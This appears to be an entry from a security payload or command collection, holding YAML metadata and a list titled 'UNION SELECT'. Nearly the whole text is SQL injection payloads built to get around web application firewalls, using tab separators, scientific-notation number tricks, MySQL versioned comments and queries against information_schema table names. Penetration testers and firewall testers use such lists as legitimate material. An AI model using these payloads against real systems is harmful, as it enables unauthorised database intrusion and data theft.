---
id: 22722dd4-a1cb-488b-8aac-c859f14ea144
name: UNION SELECT
type: command
executor: bash
data: "1.UNION\tSELECT\t2\t\n3.2UNION\tSELECT\t2\t\n1e0UNION\tSELECT\t2\t\nSELECT\\\
  N/0.e3UNION\tSELECT\t2\t\n1e1AND-0.0UNION\tSELECT\t2\t\n1/*!12345UNION/*!31337SELECT/*!table_name*/\t\
  \n{ts\t1}UNION\tSELECT.``\t1.e.table_name\t\nSELECT\t$.``\t1.e.table_name\t\nSELECT{_\t\
  .``1.e.table_name}\t\nSELECT\tLightOS\t.\t``1.e.table_name\tLightOS\t\nSELECT\t\
  information_schema 1337.e.tables\t13.37e.table_name\t\nSELECT\t1\tfrom\tinformation_schema\
  \ 9.e.table_name"
output: null
created_at: '2023-04-06T03:56:36.798488+00:00'
updated_at: '2023-04-10T20:24:20.298460+00:00'
---

# UNION SELECT

```bash
1.UNION	SELECT	2	
3.2UNION	SELECT	2	
1e0UNION	SELECT	2	
SELECT\N/0.e3UNION	SELECT	2	
1e1AND-0.0UNION	SELECT	2	
1/*!12345UNION/*!31337SELECT/*!table_name*/	
{ts	1}UNION	SELECT.``	1.e.table_name	
SELECT	$.``	1.e.table_name	
SELECT{_	.``1.e.table_name}	
SELECT	LightOS	.	``1.e.table_name	LightOS	
SELECT	information_schema 1337.e.tables	13.37e.table_name	
SELECT	1	from	information_schema 9.e.table_name
```


